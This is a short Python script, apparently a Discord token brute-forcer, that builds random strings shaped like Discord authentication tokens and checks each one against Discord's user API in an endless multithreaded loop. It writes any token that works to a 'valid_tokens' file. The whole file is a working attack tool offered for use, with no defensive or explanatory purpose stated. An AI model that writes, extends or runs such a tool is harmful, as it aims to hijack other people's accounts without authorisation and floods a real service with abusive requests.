import string
import requests
import random
import threading
import os

def main():
    clear()
    create_directory_and_files()

    try:
        threads_number = int(input("Threads Number -> "))
    except ValueError:
        handle_error("Invalid number of threads")
        threads_number = 1

    def token_check():
        first = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(random.choice([24, 26])))
        second = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(6))
        third = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(38))
        token = f"{first}.{second}.{third}"

        try:
            user = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token}).json()
            if 'username' in user:
                print(f"Valid | {token}")
                write_to_file('tokens/valid_tokens.txt', token)
            else:
                print(f"Invalid | {token}")
                write_to_file('tokens/invalid_tokens.txt', token)
        except Exception as e:
            print(f"Error | {token} | Error: {e}")
            write_to_file('tokens/invalid_tokens.txt', token)

    def request():
        threads = []
        try:
            for _ in range(threads_number):
                t = threading.Thread(target=token_check)
                t.start()
                threads.append(t)
        except Exception as e:
            handle_error(e)

        for thread in threads:
            thread.join()

    while True:
        request()

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def handle_error(e):
    print(f"An error occurred: {e}")

def create_directory_and_files():
    if not os.path.exists('tokens'):
        os.makedirs('tokens')
    
    with open('tokens/valid_tokens.txt', 'w') as f:
        f.write("Valid Tokens:\n")
    with open('tokens/invalid_tokens.txt', 'w') as f:
        f.write("Invalid Tokens:\n")

def write_to_file(filename, token):
    with open(filename, 'a') as f:
        f.write(f"{token}\n")

if __name__ == "__main__":
    main()
